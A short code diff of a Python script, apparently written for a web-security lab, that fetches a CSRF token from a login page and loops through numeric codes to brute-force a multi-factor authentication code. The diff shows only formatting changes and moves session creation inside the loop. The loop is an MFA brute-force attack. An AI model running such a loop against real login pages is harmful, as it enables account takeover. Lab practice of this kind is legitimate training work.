@@ -1,13 +1,13 @@
 import requests
-from bs4 import BeautifulSoup
 import sys
 import urllib3
+from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {"http": "http://127.0.0.1:8087", "https": "http://127.0.0.1:8087"}
+proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}
 
-def get_csrf_token(session, url):
+def get_csrf_token(session, url) :
     # Send an initial GET request to the login page
     response = session.get(url, proxies=proxies, verify=False)
     
@@ -27,10 +27,10 @@ def get_csrf_token(session, url):
         print("CSRF token not found in the HTML.")
         return None
 
-def auth_exploit(url):
-    session = requests.Session()
+def auth_exploit(url) :
     mfa_code = ""
     for i in range(0, 10000, 2):
+        session = requests.Session()    
         # Get the CSRF token by visiting the login page
         csrf_token = get_csrf_token(session, url + "/login")
         data = {
